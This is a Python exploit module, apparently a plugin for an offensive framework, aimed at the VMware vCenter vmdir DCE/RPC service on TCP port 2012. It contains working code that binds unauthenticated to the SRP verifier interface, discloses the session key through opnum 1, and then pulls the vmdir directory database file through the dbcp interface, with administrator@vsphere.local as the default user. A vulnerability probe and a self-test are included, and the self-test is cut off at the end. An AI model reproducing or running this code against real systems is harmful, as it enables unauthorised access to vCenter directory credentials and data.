#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
VMware vCenter vmdir — DCE/RPC rpc_srp_verifier + vmdirdbcp (TCP 2012).

CVE-2026-123890: unauthenticated SRP session-key disclosure (opnum 1 without verify_session).
Pure stdlib; semantics mirror lwraft/thirdparty/csrp.
"""

from __future__ import annotations

import hashlib
import os
import socket
import struct
from typing import Any, Dict, List, Optional, Tuple

from core.framework.base_module import BaseModule

IFACE_SRP_UUID = "c7e94609-6ab0-4767-8e92-b6485bff1649"
IFACE_DBCP_UUID = "72C780FE-AF6B-42BA-9B02-F61F4CCC98ED"
NDR_SYNTAX_UUID = "8a885d04-1ceb-11c9-9fe8-08002b104860"

SRP_SHA1, SRP_SHA224, SRP_SHA256, SRP_SHA384, SRP_SHA512 = 0, 1, 2, 3, 4
SRP_NG_1024, SRP_NG_2048, SRP_NG_4096, SRP_NG_8192, SRP_NG_CUSTOM = 0, 1, 2, 3, 4
HASH_FUNCS = {
    SRP_SHA1: hashlib.sha1,
    SRP_SHA224: hashlib.sha224,
    SRP_SHA256: hashlib.sha256,
    SRP_SHA384: hashlib.sha384,
    SRP_SHA512: hashlib.sha512,
}
ALG_NAMES = {
    "SHA1": SRP_SHA1,
    "SHA224": SRP_SHA224,
    "SHA256": SRP_SHA256,
    "SHA384": SRP_SHA384,
    "SHA512": SRP_SHA512,
}

N_HEX_2048 = (
    "AC6BDB41324A9A9BF166DE5E1389582FAF72B6651987EE07FC3192943DB56050"
    "A37329CBB4A099ED8193E0757767A13DD52312AB4B03310DCD7F48A9DA04FD50"
    "E8083969EDB767B0CF6095179A163AB3661A05FBD5FAAAE82918A9962F0B93B8"
    "55F97993EC975EEAA80D740ADBF4FF747359D041D5C33EA71D281E446B14773B"
    "CA97B43A23FB801676BD207A436C6481F1D2B9078717461A5B9D32E688F87748"
    "544523B524B0D57D5EA77A2775D2ECFA032CFBDBF52FB3786160279004E57AE6"
    "AF874E7303CE53299CCC041C7BC308D82A5698F3A8D0C38271AE35F8E9DBFBB6"
    "94B5C803D89F7AE435DE236D525F54759B65E372FCD68EF20FA7111F9E4AFF73"
)
GROUPS = {SRP_NG_2048: (int(N_HEX_2048, 16), 2)}
DEFAULT_ALG = SRP_SHA256
DEFAULT_NG = SRP_NG_2048
DEFAULT_DBCP_PATH = "/storage/db/vmware-vmdir/data.mdb"
DEFAULT_USER = "administrator@vsphere.local"
DEFAULT_PORT = 2012

PTYPE_REQUEST, PTYPE_RESPONSE, PTYPE_FAULT = 0x00, 0x02, 0x03
PTYPE_BIND, PTYPE_BINDACK, PTYPE_BINDNAK = 0x0B, 0x0C, 0x0D
PTYPE_ALTERCTX, PTYPE_ALTERCTX_R = 0x0E, 0x0F
PFC_FIRST_FRAG, PFC_LAST_FRAG = 0x01, 0x02
ACK_ACCEPTANCE = 0
NULL_HANDLE = b"\x00" * 20


def uuid_to_bytes(u: str) -> bytes:
    return struct.pack("<IHH", *(int(p, 16) for p in u.split("-")[:3])) + bytes.fromhex(
        "".join(u.split("-")[3:])
    )


def bytes_to_uuid(b: bytes) -> str:
    a, bb, c = struct.unpack("<IHH", b[:8])
    return "%08x-%04x-%04x-%s-%s" % (a, bb, c, b[8:10].hex(), b[10:16].hex())


def syntax_block(uuid_str: str, ver_major: int, ver_minor: int) -> bytes:
    return uuid_to_bytes(uuid_str) + struct.pack("<HH", ver_major, ver_minor)


def srp_ng(ng_type: int, n_hex=None, g_hex=None):
    if ng_type == SRP_NG_CUSTOM:
        if not n_hex or not g_hex:
            raise ValueError("SRP_NG_CUSTOM needs n_hex and g_hex")
        return int(n_hex, 16), int(g_hex, 16)
    return GROUPS[ng_type]


def srp_hash(alg: int):
    return HASH_FUNCS[alg]


def _hn(h, n):
    return h(_num_to_bytes(n)).digest()


def _num_to_bytes(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative")
    return n.to_bytes(max(1, (n.bit_length() + 7) // 8), "big")


def _bytes_to_num(b: bytes) -> int:
    return int.from_bytes(b, "big")


def calc_k(alg: int, N: int, g: int) -> int:
    h = srp_hash(alg)
    return _bytes_to_num(h(_num_to_bytes(N) + _num_to_bytes(g)).digest())


def calc_u(alg: int, A: int, B: int) -> int:
    h = srp_hash(alg)
    return _bytes_to_num(h(_num_to_bytes(A) + _num_to_bytes(B)).digest())


def calc_x(alg: int, salt: int, username: str, password: str) -> int:
    h = srp_hash(alg)
    inner = h(username.encode("utf-8") + b":" + password.encode("utf-8")).digest()
    return _bytes_to_num(h(_num_to_bytes(salt) + inner).digest())


def calc_M(alg: int, N: int, g: int, username: str, s, A, B, K) -> bytes:
    h = srp_hash(alg)
    hlen = h().digest_size
    hx = bytes(a ^ b for a, b in zip(_hn(h, N), _hn(h, g)))
    m = hashlib.new(h().name)
    m.update(hx)
    m.update(h(username.encode("utf-8")).digest())
    m.update(_num_to_bytes(s))
    m.update(_num_to_bytes(A))
    m.update(_num_to_bytes(B))
    m.update(_num_to_bytes(K)[:hlen])
    return m.digest()


def calc_HAMK(alg: int, A, M: bytes, K) -> bytes:
    h = srp_hash(alg)
    hlen = h().digest_size
    m = hashlib.new(h().name)
    m.update(_num_to_bytes(A))
    m.update(M)
    m.update(_num_to_bytes(K)[:hlen])
    return m.digest()


class SrpClient:
    def __init__(
        self,
        username: str,
        password: str,
        alg=DEFAULT_ALG,
        ng_type=DEFAULT_NG,
        n_hex=None,
        g_hex=None,
        a=None,
        salt=None,
    ):
        self.username, self.password, self.alg = username, password, alg
        self.N, self.g = srp_ng(ng_type, n_hex, g_hex)
        self.k = calc_k(self.alg, self.N, self.g)
        self.a = a if a is not None else _bytes_to_num(os.urandom(32))
        self.salt = salt if salt is not None else _bytes_to_num(os.urandom(16))
        self.A = pow(self.g, self.a, self.N)
        self.B = None
        self.K = None

    def set_B(self, B: int):
        self.B = B
        self.u = calc_u(self.alg, self.A, B)
        self.x = calc_x(self.alg, self.salt, self.username, self.password)
        base = (B - self.k * pow(self.g, self.x, self.N)) % self.N
        S = pow(base, self.a + self.u * self.x, self.N)
        self.S_client = S
        self.K = _bytes_to_num(srp_hash(self.alg)(_num_to_bytes(S)).digest())
        return self.K

    def evidence_M(self) -> bytes:
        return calc_M(self.alg, self.N, self.g, self.username, self.salt, self.A, self.B, self.K)


class SrpVerifier:
    def __init__(
        self,
        username: str,
        salt: int,
        v: int,
        A: int,
        alg=DEFAULT_ALG,
        ng_type=DEFAULT_NG,
        n_hex=None,
        g_hex=None,
        b=None,
    ):
        self.username, self.alg = username, alg
        self.N, self.g = srp_ng(ng_type, n_hex, g_hex)
        self.salt, self.v = salt, v
        self.safety_ok = (A % self.N) != 0
        self.A = A
        self.authenticated = False
        self.session_key = None
        self.M = self.HAMK = None
        if not self.safety_ok:
            return
        self.k = calc_k(self.alg, self.N, self.g)
        self.b = b if b is not None else _bytes_to_num(os.urandom(32))
        self.B = self.k * self.v + pow(self.g, self.b, self.N)
        self.u = calc_u(self.alg, A, self.B)
        S = pow(A * pow(self.v, self.u, self.N), self.b, self.N)
        self.session_key = _bytes_to_num(srp_hash(self.alg)(_num_to_bytes(S)).digest())
        self.M = calc_M(self.alg, self.N, self.g, username, salt, A, self.B, self.session_key)
        self.HAMK = calc_HAMK(self.alg, A, self.M, self.session_key)

    def get_session_key(self):
        return self.session_key

    def verify_session(self, user_M: bytes):
        if self.M is not None and user_M == self.M:
            self.authenticated = True
            return self.HAMK
        return None


class NdrWriter:
    def __init__(self):
        self.b = bytearray()

    def u32(self, v):
        self.b += struct.pack("<I", v & 0xFFFFFFFF)

    def i32(self, v):
        self.b += struct.pack("<i", v)

    def raw(self, data: bytes):
        self.b += data

    def pad4(self):
        while len(self.b) % 4:
            self.b += b"\x00"

    def udef_ptr(self, referent=1):
        self.u32(referent)

    def conformant_bytes(self, data: bytes):
        self.u32(len(data))
        self.raw(data)
        self.pad4()

    def char_string(self, s: str):
        enc = s.encode("utf-8") + b"\x00"
        self.udef_ptr(1)
        self.u32(len(enc))
        self.u32(0)
        self.u32(len(enc))
        self.raw(enc)
        self.pad4()

    def wchar_string(self, s: str):
        enc = s.encode("utf-16-le") + b"\x00\x00"
        self.udef_ptr(1)
        self.u32(len(enc) // 2)
        self.u32(0)
        self.u32(len(enc) // 2)
        self.raw(enc)
        self.pad4()

    def wchar_string_ref(self, s: str):
        enc = s.encode("utf-16-le") + b"\x00\x00"
        self.u32(len(enc) // 2)
        self.u32(0)
        self.u32(len(enc) // 2)
        self.raw(enc)
        self.pad4()

    def null_char_string(self):
        self.udef_ptr(0)

    def ctx_handle(self, handle20: bytes):
        self.raw(handle20)

    def bytes(self) -> bytes:
        return bytes(self.b)


class NdrCursor:
    def __init__(self, data: bytes):
        self.d = data
        self.o = 0

    def need(self, n: int):
        if self.o + n > len(self.d):
            raise ValueError("stub underrun at offset %d" % self.o)

    def u32(self):
        self.align4()
        self.need(4)
        v = struct.unpack_from("<I", self.d, self.o)[0]
        self.o += 4
        return v

    def i32(self):
        self.align4()
        self.need(4)
        v = struct.unpack_from("<i", self.d, self.o)[0]
        self.o += 4
        return v

    def raw(self, n: int) -> bytes:
        self.need(n)
        v = self.d[self.o : self.o + n]
        self.o += n
        return v

    def align4(self):
        self.o += (-self.o) % 4

    def eof(self):
        return self.o >= len(self.d)

    def ptr_flag(self):
        return self.u32()

    def conformant_bytes(self, count=None):
        mc = self.u32()
        n = count if count is not None else mc
        self.need(n)
        data = self.d[self.o : self.o + n]
        self.o += n
        self.align4()
        return data, mc

    def char_string(self):
        flag = self.ptr_flag()
        if flag == 0:
            return None
        mc, off, actual = self.u32(), self.u32(), self.u32()
        data = self.raw(actual)
        self.align4()
        return data[:-1].decode("utf-8", "replace")

    def wchar_string(self):
        flag = self.ptr_flag()
        if flag == 0:
            return None
        mc, off, actual = self.u32(), self.u32(), self.u32()
        data = self.raw(actual * 2)
        self.align4()
        return data[:-2].decode("utf-16-le", "replace")

    def wchar_string_ref(self):
        mc, off, actual = self.u32(), self.u32(), self.u32()
        data = self.raw(actual * 2)
        self.align4()
        return data[:-2].decode("utf-16-le", "replace")

    def ctx_handle(self) -> bytes:
        return self.raw(20)


def parse_container(c: NdrCursor):
    flag = c.ptr_flag()
    if flag == 0:
        return None
    ln = c.i32()
    inner = c.ptr_flag()
    if inner == 0:
        return b""
    data, mc = c.conformant_bytes()
    if ln < 0 or ln > mc:
        raise ValueError("container len inconsistent")
    return data[:ln]


def write_container_out(w: NdrWriter, data: bytes):
    w.udef_ptr(1)
    w.i32(len(data))
    w.udef_ptr(1)
    w.conformant_bytes(data)


def build_srp_new_request(alg, ng_type, username, A_bytes, n_hex=None, g_hex=None, send_null_handle=False):
    w = NdrWriter()
    w.i32(alg)
    w.i32(ng_type)
    w.char_string(username)
    w.udef_ptr(1)
    w.i32(len(A_bytes))
    w.udef_ptr(1)
    w.conformant_bytes(A_bytes)
    w.udef_ptr(0)
    w.udef_ptr(0)
    w.udef_ptr(0)
    if n_hex is None:
        w.null_char_string()
    else:
        w.char_string(n_hex)
    if g_hex is None:
        w.null_char_string()
    else:
        w.char_string(g_hex)
    w.ctx_handle(NULL_HANDLE)
    if send_null_handle:
        w.ctx_handle(NULL_HANDLE)
    return w.bytes()


def parse_srp_new_response(stub: bytes):
    c = NdrCursor(stub)
    B = parse_container(c)
    s = parse_container(c)
    mda = parse_container(c)
    hsrp = c.ctx_handle()
    ret = c.i32()
    if not c.eof():
        raise ValueError("trailing bytes in opnum0 response stub")
    return {"B": B, "s": s, "mda": mda, "hSrp": hsrp, "ret": ret}


def build_getkey_request(hsrp20: bytes, send_null_handle=False):
    w = NdrWriter()
    w.ctx_handle(hsrp20)
    if send_null_handle:
        w.ctx_handle(NULL_HANDLE)
    w.udef_ptr(1)
    w.i32(0)
    w.udef_ptr(1)
    w.conformant_bytes(b"")
    return w.bytes()


def parse_getkey_response(stub: bytes):
    c = NdrCursor(stub)
    key = parse_container(c)
    ret = c.i32()
    if not c.eof():
        raise ValueError("trailing bytes in opnum1 response stub")
    return {"key": key, "ret": ret}


def build_verify_request(hsrp20: bytes, M: bytes):
    w = NdrWriter()
    w.ctx_handle(hsrp20)
    w.udef_ptr(1)
    w.i32(len(M))
    w.udef_ptr(1)
    w.conformant_bytes(M)
    w.udef_ptr(0)
    return w.bytes()


def parse_verify_response(stub: bytes):
    c = NdrCursor(stub)
    hamk = parse_container(c)
    ret = c.i32()
    return {"HAMK": hamk, "ret": ret}


def build_dbcp_open_request(path: str, send_null_handle=False):
    w = NdrWriter()
    w.wchar_string_ref(path)
    w.ctx_handle(NULL_HANDLE)
    if send_null_handle:
        w.ctx_handle(NULL_HANDLE)
    return w.bytes()


def parse_dbcp_open_response(stub: bytes):
    c = NdrCursor(stub)
    fh = c.ctx_handle()
    ret = c.i32()
    if not c.eof():
        raise ValueError("trailing bytes in dbcp open response stub")
    return {"fileHandle": fh, "ret": ret}


def build_dbcp_read_request(fh20: bytes, count: int, send_null_handle=False):
    w = NdrWriter()
    w.ctx_handle(fh20)
    w.u32(count)
    w.i32(count)
    w.udef_ptr(0)
    if send_null_handle:
        w.ctx_handle(NULL_HANDLE)
    return w.bytes()


def parse_dbcp_read_response(stub: bytes):
    c = NdrCursor(stub)
    dwcount = c.i32()
    flag = c.ptr_flag()
    data = b""
    if flag:
        data, _mc = c.conformant_bytes()
    ret = c.i32()
    if not c.eof():
        raise ValueError("trailing bytes in dbcp read response stub")
    return {"dwCount": dwcount, "data": data, "ret": ret}


def build_dbcp_close_request(fh20: bytes, send_null_handle=False):
    w = NdrWriter()
    w.ctx_handle(fh20)
    if send_null_handle:
        w.ctx_handle(NULL_HANDLE)
    return w.bytes()


def parse_dbcp_close_response(stub: bytes):
    c = NdrCursor(stub)
    fh = c.ctx_handle()
    ret = c.i32()
    if not c.eof():
        raise ValueError("trailing bytes in dbcp close response stub")
    return {"fileHandle": fh, "ret": ret}


class DceFault(Exception):
    def __init__(self, status, note=None):
        if isinstance(status, int):
            msg = "RPC fault 0x%08x" % (status & 0xFFFFFFFF)
            if note:
                msg = "%s: %s" % (msg, note)
            self.status = status & 0xFFFFFFFF
        else:
            msg = str(status)
            self.status = None
        super().__init__(msg)


class CtxItem:
    def __init__(self, ctx_id, iface_uuid, iface_ver=(1, 0), xfer_uuid=NDR_SYNTAX_UUID, xfer_ver=(2, 0)):
        self.ctx_id = ctx_id
        self.iface = (iface_uuid,) + tuple(iface_ver)
        self.xfer = (xfer_uuid,) + tuple(xfer_ver)

    def pack(self) -> bytes:
        return (
            struct.pack("<HBB", self.ctx_id, 1, 0)
            + syntax_block(self.iface[0], self.iface[1], self.iface[2])
            + syntax_block(self.xfer[0], self.xfer[1], self.xfer[2])
        )


def _common_header(ptype, frag_len, auth_len, call_id, flags):
    return struct.pack("<BBBBIHHI", 5, 0, ptype, flags, 0x10, frag_len, auth_len, call_id)


class BindBody:
    def __init__(self, ctx_items: List[CtxItem]):
        self.ctx_items = ctx_items

    def pack(self) -> bytes:
        items = b"".join(i.pack() for i in self.ctx_items)
        return struct.pack("<HHIBBH", 4280, 4280, 0, len(self.ctx_items), 0, 0) + items


def build_bind(call_id: int, ctx_items: List[CtxItem]) -> bytes:
    body = BindBody(ctx_items).pack()
    hdr = _common_header(PTYPE_BIND, 16 + len(body), 0, call_id, PFC_FIRST_FRAG | PFC_LAST_FRAG)
    return hdr + body


def parse_bind_ack(data: bytes, expect_ptype=PTYPE_BINDACK):
    if len(data) < 16:
        raise ValueError("PDU shorter than common header")
    _ver, _vmin, ptype, _flags, _rep, _frag_len, _auth_len, call_id = struct.unpack_from(
        "<BBBBIHHI", data, 0
    )
    if ptype == PTYPE_BINDNAK:
        reason = struct.unpack_from("<H", data, 16)[0]
        raise DceFault("bind_nak: provider rejection reason 0x%x" % reason)
    if ptype != expect_ptype:
        raise ValueError("expected ptype %d, got %d" % (expect_ptype, ptype))
    o = 16
    max_tfrag, max_rfrag, assoc_group = struct.unpack_from("<HHI", data, o)
    o += 8
    sec_len = struct.unpack_from("<H", data, o)[0]
    o += 2
    sec_addr = data[o : o + sec_len].rstrip(b"\x00").decode("ascii", "replace")
    o += sec_len
    o += (-(o)) % 4
    ctx_num, _r1, _r2 = struct.unpack_from("<BBH", data, o)
    o += 4
    results = []
    for _ in range(ctx_num):
        result, reason = struct.unpack_from("<HH", data, o)
        o += 4
        xfer = data[o : o + 20]
        o += 20
        results.append(
            {
                "result": result,
                "reason": reason,
                "syntax": bytes_to_uuid(xfer[:16]),
                "syntax_ver": struct.unpack_from("<HH", xfer, 16),
            }
        )
    return {
        "max_tfrag": max_tfrag,
        "max_rfrag": max_rfrag,
        "assoc_group": assoc_group,
        "sec_addr": sec_addr,
        "call_id": call_id,
        "results": results,
    }


def sec_trailer_bytes(auth_type, auth_level, auth_ctx_id, pad_len):
    return struct.pack("<BBBB", auth_type, auth_level, pad_len, 0) + struct.pack("<I", auth_ctx_id)


def build_request(call_id, opnum, stub: bytes, ctx_id=0, auth=None):
    body = struct.pack("<IHH", len(stub), ctx_id, opnum) + stub
    auth_data = b""
    pad = b""
    auth_len = 0
    if auth is not None:
        auth_type, auth_level, actx, token = auth
        pad = b"\x00" * ((4 - (24 + len(body)) % 4) % 4)
        auth_data = sec_trailer_bytes(auth_type, auth_level, actx, len(pad)) + token
        auth_len = len(token)
    flags = PFC_FIRST_FRAG | PFC_LAST_FRAG
    hdr = _common_header(PTYPE_REQUEST, 16 + len(body) + len(pad) + len(auth_data), auth_len, call_id, flags)
    return hdr + body + pad + auth_data


def parse_response_pdus(data: bytes, first_frag=True):
    if len(data) < 16:
        raise ValueError("PDU shorter than common header")
    _ver, _vmin, ptype, _flags, _rep, frag_len, auth_len, _call_id = struct.unpack_from(
        "<BBBBIHHI", data, 0
    )
    if ptype in (PTYPE_RESPONSE, PTYPE_FAULT):
        body_off = 24 if first_frag else 16
        stub = data[body_off:frag_len]
        if auth_len:
            trailer = data[frag_len - auth_len - 8 : frag_len - auth_len]
            pad_len = trailer[2]
            stub = data[body_off : frag_len - auth_len - 8 - pad_len]
        if ptype == PTYPE_FAULT:
            status = struct.unpack_from("<I", data, 24)[0]
            raise DceFault(status)
        return ptype, _call_id, stub
    raise ValueError("unexpected PDU type %d during call" % ptype)


class DceConnection:
    def __init__(self, host: str, port: int = DEFAULT_PORT, timeout: float = 10.0):
        self.sock = socket.create_connection((host, port), timeout)
        self.call_id = 0

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass

    def _send(self, data: bytes):
        self.sock.sendall(data)

    def _recv_exact(self, n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = self.sock.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("connection closed by peer")
            buf += chunk
        return buf

    def _recv_pdu(self) -> bytes:
        hdr = self._recv_exact(16)
        frag_len, _auth_len = struct.unpack_from("<HH", hdr, 8)
        rest = self._recv_exact(frag_len - 16)
        return hdr + rest

    def next_call_id(self) -> int:
        self.call_id += 1
        return self.call_id

    def bind(self, ctx_items: List[CtxItem]):
        cid = self.next_call_id()
        self._send(build_bind(cid, ctx_items))
        return parse_bind_ack(self._recv_pdu(), PTYPE_BINDACK)

    def bind_alter(self, ctx_items: List[CtxItem]):
        cid = self.next_call_id()
        pkt = bytearray(build_bind(cid, ctx_items))
        pkt[2] = PTYPE_ALTERCTX
        self._send(bytes(pkt))
        return parse_bind_ack(self._recv_pdu(), PTYPE_ALTERCTX_R)

    def call(self, opnum: int, stub: bytes, ctx_id=0, auth=None) -> bytes:
        cid = self.next_call_id()
        self._send(build_request(cid, opnum, stub, ctx_id, auth))
        assembled = b""
        first = True
        while True:
            data = self._recv_pdu()
            _ptype, rcid, part = parse_response_pdus(data, first_frag=first)
            if rcid != cid:
                raise ValueError("response call_id %d != %d" % (rcid, cid))
            assembled += part
            first = False
            frag_last = bool(data[3] & PFC_LAST_FRAG)
            if frag_last:
                break
        return assembled


def ctx_srp(ctx_id=0) -> CtxItem:
    return CtxItem(ctx_id, IFACE_SRP_UUID, (1, 0))


def ctx_dbcp(ctx_id=1) -> CtxItem:
    return CtxItem(ctx_id, IFACE_DBCP_UUID, (1, 0))


def srp_new_and_key(
    conn: DceConnection,
    user: str,
    alg: int,
    ng_type: int,
    send_null_handle: bool = False,
    auth=None,
) -> Tuple[Dict, Optional[Dict]]:
    a = int.from_bytes(os.urandom(32), "big")
    N, g = srp_ng(ng_type)
    A = pow(g, a, N)
    A_bytes = _num_to_bytes(A)
    stub = build_srp_new_request(alg, ng_type, user, A_bytes, send_null_handle=send_null_handle)
    resp = parse_srp_new_response(conn.call(0, stub, 0, auth))
    if resp["ret"] != 0:
        return resp, None
    kstub = build_getkey_request(resp["hSrp"], send_null_handle)
    kresp = parse_getkey_response(conn.call(1, kstub, 0, auth))
    return resp, kresp


class VmdirdClient:
    """High-level vmdir RPC client (TCP 2012)."""

    def __init__(self, host: str, port: int = DEFAULT_PORT, timeout: float = 10.0):
        self.host = str(host)
        self.port = int(port)
        self.timeout = float(timeout)

    def probe(self, include_dbcp: bool = False) -> Dict[str, Any]:
        conn = DceConnection(self.host, self.port, self.timeout)
        try:
            items = [ctx_srp(0), ctx_dbcp(1)] if include_dbcp else [ctx_srp(0)]
            ack = conn.bind(items)
            results = ack.get("results") or []
            srp_ok = bool(results) and results[0]["result"] == ACK_ACCEPTANCE
            dbcp_ok = len(results) > 1 and results[1]["result"] == ACK_ACCEPTANCE
            return {
                "ok": True,
                "srp_accepted": srp_ok,
                "dbcp_accepted": dbcp_ok,
                "vulnerable": srp_ok,
                "sec_addr": ack.get("sec_addr", ""),
                "assoc_group": ack.get("assoc_group"),
                "results": results,
            }
        except Exception as exc:
            return {"ok": False, "error": str(exc), "vulnerable": False}
        finally:
            conn.close()

    def disclose_session_key(
        self,
        user: str = DEFAULT_USER,
        alg: int = DEFAULT_ALG,
        ng_type: int = DEFAULT_NG,
        send_null_handle: bool = False,
        auth=None,
    ) -> Dict[str, Any]:
        conn = DceConnection(self.host, self.port, self.timeout)
        try:
            ack = conn.bind([ctx_srp(0)])
            if not ack["results"] or ack["results"][0]["result"] != ACK_ACCEPTANCE:
                return {"ok": False, "reason": "rpc_srp_verifier bind rejected", "bind": ack}
            srp_resp, key_resp = srp_new_and_key(
                conn, user, alg, ng_type, send_null_handle=send_null_handle, auth=auth
            )
            out: Dict[str, Any] = {
                "ok": False,
                "srp_ret": srp_resp.get("ret"),
                "user": user,
            }
            if key_resp is None:
                out["reason"] = "rpc_srp_verifier_new failed"
                out["srp"] = srp_resp
                return out
            out["key_ret"] = key_resp.get("ret")
            key = key_resp.get("key")
            if key_resp.get("ret") == 0 and key is not None:
                out["ok"] = True
                out["session_key_hex"] = key.hex()
                out["session_key_len"] = len(key)
            else:
                out["reason"] = "no session key in opnum1 response"
            return out
        except Exception as exc:
            return {"ok": False, "error": str(exc)}
        finally:
            conn.close()

    def pull_database(
        self,
        user: str = DEFAULT_USER,
        path: str = DEFAULT_DBCP_PATH,
        chunk: int = 65536,
        max_reads: int = 100000,
        send_null_handle: bool = False,
        auth=None,
    ) -> Tuple[bytes, Dict[str, Any]]:
        conn = DceConnection(self.host, self.port, self.timeout)
        meta: Dict[str, Any] = {"bytes": 0, "reads": 0}
        data_all = bytearray()
        try:
            dbcp_ctx_ok = False
            try:
                ack = conn.bind([ctx_srp(0), ctx_dbcp(1)])
                r0, r1 = ack["results"][0], ack["results"][1]
                dbcp_ctx_ok = r1["result"] == ACK_ACCEPTANCE
                meta["bind_srp"] = r0["result"]
                meta["bind_dbcp"] = r1["result"]
            except DceFault:
                conn.close()
                conn = DceConnection(self.host, self.port, self.timeout)
                ack = conn.bind([ctx_srp(0)])
                meta["bind_srp"] = ack["results"][0]["result"]
            if not dbcp_ctx_ok:
                ack2 = conn.bind_alter([ctx_dbcp(1)])
                meta["alter_dbcp"] = ack2["results"][0]["result"]

            _srp, kresp = srp_new_and_key(
                conn, user, DEFAULT_ALG, DEFAULT_NG, send_null_handle=send_null_handle, auth=auth
            )
            meta["key_disclosed"] = bool(kresp and kresp.get("ret") == 0 and kresp.get("key"))

            ostub = build_dbcp_open_request(path, send_null_handle)
            oresp = parse_dbcp_open_response(conn.call(0, ostub, 1, auth))
            meta["open_ret"] = oresp["ret"]
            if oresp["ret"] != 0:
                return b"", meta
            fh = oresp["fileHandle"]
            try:
                for i in range(max_reads):
                    rstub = build_dbcp_read_request(fh, chunk, send_null_handle)
                    try:
                        rresp = parse_dbcp_read_response(conn.call(1, rstub, 1, auth))
                    except DceFault as exc:
                        meta["read_fault"] = str(exc)
                        break
                    meta["reads"] = i + 1
                    if rresp["ret"] != 0:
                        meta["read_ret"] = rresp["ret"]
                        break
                    data = rresp["data"]
                    if not data:
                        break
                    data_all += data
                    if len(data) < chunk:
                        break
            finally:
                cstub = build_dbcp_close_request(fh, send_null_handle)
                cresp = parse_dbcp_close_response(conn.call(2, cstub, 1, auth))
                meta["close_ret"] = cresp["ret"]
        finally:
            conn.close()
        meta["bytes"] = len(data_all)
        return bytes(data_all), meta


def _get_module_str(module, *names, default="") -> str:
    for name in names:
        raw = getattr(module, name, None)
        if raw is None:
            continue
        if hasattr(raw, "value"):
            raw = raw.value
        s = str(raw or "").strip()
        if s:
            return s.split("://")[-1].split("/")[0].split(":")[0]
    return default


class Vcenter_vmdird(BaseModule):
    """Mixin for vmdir DCE/RPC helpers."""

    def vmdird_host(self) -> str:
        if hasattr(self, "_host"):
            host = self._host()
            if host:
                return host
        return _get_module_str(self, "target", "rhost")

    def vmdird_port(self) -> int:
        if hasattr(self, "_port"):
            return int(self._port())
        port = getattr(self, "port", DEFAULT_PORT)
        if hasattr(port, "value"):
            port = port.value
        return int(port or DEFAULT_PORT)

    def vmdird_timeout(self) -> float:
        if hasattr(self, "_timeout"):
            return float(self._timeout())
        timeout = getattr(self, "timeout", 10)
        if hasattr(timeout, "value"):
            timeout = timeout.value
        return float(timeout or 10)

    def vmdird_client(self) -> VmdirdClient:
        return VmdirdClient(self.vmdird_host(), self.vmdird_port(), self.vmdird_timeout())

    def vmdird_probe(self, include_dbcp: bool = False) -> Dict[str, Any]:
        return self.vmdird_client().probe(include_dbcp=include_dbcp)

    def vmdird_disclose_key(
        self,
        user: Optional[str] = None,
        alg_name: str = "SHA256",
        send_null_handle: bool = False,
        auth=None,
    ) -> Dict[str, Any]:
        alg = ALG_NAMES.get(alg_name.upper(), DEFAULT_ALG)
        user = user or DEFAULT_USER
        return self.vmdird_client().disclose_session_key(
            user=user,
            alg=alg,
            send_null_handle=send_null_handle,
            auth=auth,
        )

    def vmdird_pull_db(
        self,
        user: Optional[str] = None,
        path: str = DEFAULT_DBCP_PATH,
        chunk: int = 65536,
        max_reads: int = 100000,
        send_null_handle: bool = False,
        auth=None,
    ) -> Tuple[bytes, Dict[str, Any]]:
        user = user or DEFAULT_USER
        return self.vmdird_client().pull_database(
            user=user,
            path=path,
            chunk=chunk,
            max_reads=max_reads,
            send_null_handle=send_null_handle,
            auth=auth,
        )

    @staticmethod
    def vmdird_auth_from_options(module) -> Optional[tuple]:
        auth_type = getattr(module, "auth_type", None)
        if auth_type is None:
            return None
        if hasattr(auth_type, "value"):
            auth_type = auth_type.value
        if auth_type is None:
            return None
        level = getattr(module, "auth_level", 6)
        ctx = getattr(module, "auth_ctx_id", 1)
        if hasattr(level, "value"):
            level = level.value
        if hasattr(ctx, "value"):
            ctx = ctx.value
        return (int(auth_type), int(level or 6), int(ctx or 1), b"")


def _st(cond, name: str, failures: List[str]) -> bool:
    if cond:
        return True
    failures.append(name)
    return False


def _miller_rabin(n: int, bases) -> bool:
    d = n - 1
    r = 0
    while d % 2 == 0:
        d //= 2
        r += 1
    for a in bases:
        a %= n
        if a in (0, 1):
            continue
        x = pow(a, d, n)
        if x in (1, n - 1):
            continue
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False
    return True


def run_selftest() -> int:
    """Unit-test encoders, SRP, and stub layouts (no network)."""
    failures: List[str] = []
    N = int(N_HEX_2048, 16)
    g = GROUPS[SRP_NG_2048][1]
    alg = DEFAULT_ALG

    _st(N.bit_length() == 2048, "N is 2048-bit", failures)
    _st(
        _miller_rabin(N, [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37]),
        "N Miller-Rabin",
        failures,
    )

    fixed_salt = int.from_bytes(bytes(range(16)), "big")
    pw = "correct horse battery staple"
    client = SrpClient(
        DEFAULT_USER,
        pw,
        alg,
        SRP_NG_2048,
        None,
        None,
        a=int.from_bytes(bytes(range(1, 33)), "big"),
        salt=fixed_salt,
    )
    x = calc_x(alg, fixed_salt, DEFAULT_USER, pw)
    verifier = SrpVerifier(
        DEFAULT_USER,
        fixed_salt,
        pow(g, x, N),
        client.A,
        alg,
        SRP_NG_2048,
        b=int.from_bytes(bytes(range(32)), "big"),
    )
    _st(verifier.session_key is not None, "verifier session_key", failures)
    Kc = client.set_B(verifier.B)
    _st(Kc == verifier.session_key, "client/server K", failures)
    _st(client.evidence_M() == verifier.M, "M match", failures)
    _st(verifier.verify_session(client.evidence_M()) == verifier.HAMK, "HAMK", failures)

    dummy = SrpClient(DEFAULT_USER, "wrong", alg, SRP_NG_2048)
    ver = SrpVerifier(
        DEFAULT_USER,
        int.from_bytes(os.urandom(16), "big"),
        pow(g, calc_x(alg, 1, DEFAULT_USER, "RealPass"), N),
        dummy.A,
        alg,
        SRP_NG_2048,
    )
    _st(not ver.authenticated and ver.get_session_key() == ver.session_key, "ungated K", failures)

    user = DEFAULT_USER
    A_b = bytes(range(1, 255))
    stub = build_srp_new_request(2, 1, user, A_b)
    c = NdrCursor(stub)
    _st(c.i32() == 2 and c.i32() == 1 and c.char_string() == user, "opnum0 req roundtrip", failures)

